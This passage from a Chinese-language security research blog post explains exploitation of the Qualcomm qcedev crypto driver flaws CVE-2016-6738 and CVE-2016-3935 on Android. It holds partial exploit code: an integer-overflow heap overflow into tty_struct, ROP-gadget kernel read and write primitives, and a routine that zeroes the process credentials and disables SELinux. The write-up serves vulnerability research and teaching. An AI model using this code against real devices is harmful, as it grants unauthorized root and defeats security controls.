<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret; </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i, cred, addr;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp0;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* search myself */</span></span><br><span class="line">        ret = get_task_by_comm(&amp;my_task);</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] get myself fail!\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!my_task || (my_task &lt; <span class="number">0xffffffc000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"invalid task address!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ret = kernel_read(my_task + cred_offset, &amp;cred);</span><br><span class="line">        <span class="keyword">if</span> (cred &lt; KERNEL_BASE) <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line"></span><br><span class="line">        i = <span class="number">1</span>; </span><br><span class="line">        addr = cred + <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_read_32(addr, &amp;tmp0);</span><br><span class="line">        <span class="keyword">if</span>(tmp0 == <span class="number">0x43736564</span> || tmp0 == <span class="number">0x44656144</span>)</span><br><span class="line">                i += <span class="number">4</span>;</span><br><span class="line">        addr = cred + (i+<span class="number">0</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0</span>);</span><br><span class="line">        addr = cred + (i+<span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0</span>);</span><br><span class="line">...     </span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0xffffffff</span>);</span><br><span class="line">        addr = cred + (i+<span class="number">16</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0xffffffff</span>);</span><br><span class="line">        <span class="comment">/* success! */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// disable SELinux</span></span><br><span class="line">        kernel_write_32(SELINUX_ENFORCING, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>搜索到本进程的 cred 结构体，并使用我们封装的内核读写函数，将其成员的值改为0，这样本进程就变成了 root 进程。<br>搜索本进程 <strong>task_struct</strong> 的函数 <strong>get_task_by_comm</strong>  具体实现参考 github 的代码。</p>
<h3 id="CVE-2016-3935-漏洞利用"><a href="#CVE-2016-3935-漏洞利用" class="headerlink" title="CVE-2016-3935 漏洞利用 [^]"></a>CVE-2016-3935 漏洞利用 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-exp"></span> </p>
<p>这个漏洞的提权方法跟 6738 是一样的，唯一不同的地方是，这是一个堆溢出漏洞，我们只能覆盖堆里边的 fops (cve-2016-6738 我们覆盖的是 .data 区里的 fops )。</p>
<p>在我测试的版本里，k_buf_src 是从 kmalloc-4096 分配出来的，因此，需要找到合适的结构来填充 kmalloc-4096 ，经过一些源码搜索，我找到了 <strong>tty_struct</strong> 这个结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/tty.h</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span>     magic;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在我做利用的设备里，这个结构是从 kmalloc-4096 堆里分配的，其偏移 24Byte 的地方是一个 <strong>struct tty_operations</strong> 的指针，我们溢出后重写这个结构体，用一个用户态地址覆盖这个指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TTY_MAGIC               0x5401</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 632 <span class="comment">// SIZE = sizeof(struct tty_struct)</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ret, cmd, i;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_sha_op_req</span> <span class="title">params</span>;</span></span><br><span class="line">        <span class="keyword">int</span> *magic;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> * ttydriver;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> * ttyops;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">        params.entries = <span class="number">9</span>;</span><br><span class="line">        params.data_len = SIZE;</span><br><span class="line">        params.authklen = <span class="number">16</span>;</span><br><span class="line">        params.authkey = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        params.alg = QCEDEV_ALG_AES_CMAC;</span><br><span class="line"></span><br><span class="line"><span class="comment">// when tty_struct coming from kmalloc-4096</span></span><br><span class="line">        magic =(<span class="keyword">int</span> *) &amp;trigger_buf[<span class="number">4096</span>];</span><br><span class="line">        *magic = TTY_MAGIC;</span><br><span class="line">        ttydriver = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;trigger_buf[<span class="number">4112</span>];</span><br><span class="line">        *ttydriver = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        ttyops = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;trigger_buf[<span class="number">4120</span>];</span><br><span class="line">        *ttyops = fake_ptm_fops;</span><br><span class="line">        params.data[<span class="number">0</span>].len = <span class="number">4128</span>;</span><br><span class="line">        params.data[<span class="number">0</span>].vaddr = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        params.data[<span class="number">1</span>].len = <span class="number">536867423</span> ;</span><br><span class="line">        params.data[<span class="number">1</span>].vaddr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; params.entries; i++) &#123;</span><br><span class="line">                params.data[i].len = <span class="number">0x1fffffff</span>;</span><br><span class="line">                params.data[i].vaddr = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cmd = QCEDEV_IOCTL_SHA_UPDATE_REQ;</span><br><span class="line">        ret = ioctl(fd, cmd, &amp;params);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] ioctl fail %s\n"</span>,strerror(errno));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] succ trigger\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>4128 + 536867423 + 7 * 0x1fffffff = 632</code></p>
<p>溢出的方法如上，我们让 entry 的数目为 9 个，第一个长度为 4128, 第二个为 536867423， 其他7个为0x1fffffff </p>
<p>这样他们加起来溢出之后的值就是 632， 这个长度刚好是 <strong>struct tty_struct</strong> 的长度，我们用  <strong>qcedev_sha_op_req.data[0].vaddr[4096]</strong> 这个数据来填充被溢出的 <strong>tty_struct</strong> 的内容</p>
<p>主要是填充两个地方，一个是最开头的 <strong>tty magic</strong>, 另一个就是偏移 24Bype 的 <strong>tty_operations</strong> 指针，我们将这个指针覆盖为伪指针 <strong>fake_ptm_fops</strong>. </p>
<p>之后的提权操作与 cve-2016-6738 类似，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/tty_driver.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">        <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">remove</span>)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*<span class="built_in">open</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">close</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">shutdown</span>)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*<span class="built_in">write</span>)(struct tty_struct * tty,</span><br><span class="line">                      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">        <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">        <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">        <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                             <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上，ioctl 函数在 <strong>tty_operations</strong> 结构体里偏移 12 个指针，当我们用 <strong>ROP_WRITE</strong> 覆盖这个位置时，可以得到一个内核地址写函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ioctl_syscall(n, efd, cmd, arg) \</span></span><br><span class="line">        eabi_syscall(n, efd, cmd, arg)</span><br><span class="line">ENTRY(eabi_syscall)</span><br><span class="line">        mov     x8, x0</span><br><span class="line">        mov     x0, x1</span><br><span class="line">        mov     x1, x2</span><br><span class="line">        mov     x2, x3</span><br><span class="line">        mov     x3, x4</span><br><span class="line">        mov     x4, x5</span><br><span class="line">        mov     x5, x6</span><br><span class="line">        svc     #<span class="number">0x0</span></span><br><span class="line">        ret</span><br><span class="line">END(eabi_syscall)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> ＊　rop write</span></span><br><span class="line"><span class="comment"> * ffffffc000671a58:       b9000041        str     w1, [x2]</span></span><br><span class="line"><span class="comment"> * ffffffc000671a5c:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE               0xffffffc000671a58</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_write_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptm_fops + <span class="number">12</span> * <span class="number">8</span>) = ROP_WRITE;</span><br><span class="line"></span><br><span class="line">        arg = addr;</span><br><span class="line">        ioctl_syscall(__NR_ioctl, fake_fd, val, arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理，当我们用 <strong>ROP_READ</strong> 覆盖这个位置时，可以得到一个内核地址写函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * rop read</span></span><br><span class="line"><span class="comment"> * ffffffc000300060:       f9405440        ldr     x0, [x2,#168]</span></span><br><span class="line"><span class="comment"> * ffffffc000300064:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_READ                0xffffffc000300060</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_read_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptm_fops + <span class="number">12</span> * <span class="number">8</span>) = ROP_READ;</span><br><span class="line">        arg = addr - <span class="number">168</span>;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        ret = ioctl_syscall(__NR_ioctl, fake_fd, <span class="number">0xdeadbeef</span>, arg);</span><br><span class="line">        *val = ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，用封装好的内核读写函数，修改内核的 cred 等结构体完成提权。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考 [^]"></a>参考 <a href="#top">[^]</a></h2><p><span id="refer"></span><br><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a></p>
<p><a href="https://github.com/xairy/linux-kernel-exploitation" target="_blank" rel="noopener">xairy</a></p>
<p><a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">New Reliable Android Kernel Root Exploitation Techniques</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/" data-id="cmd5slr1z00070lo114xle397" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="../../16/Digtool-A-Virtualization-Based-Framework-for-Detecting-Kernel-Vulnerabilities/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Digtool - A Virtualization-Based Framework for Detecting Kernel Vulnerabilities
        
      </div>
    </a>
  
  
    <a href="../../../06/14/Automatically-Discovering-Windows-Kernel-Information-Leak-Vulnerabilities_en/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Automatically Discovering Windows Kernel Information Leak Vulnerabilities</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../../../../2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
            <a href="../../../../2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="../../../../2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
  
    <a href="../../../../research" class="mobile-nav-link">Research</a>
  
    <a href="../../../../vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="../../../../recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="../../../../about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">

  
<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>




<script src="../../../../js/script.js"></script>




  </div>
</body>
</html>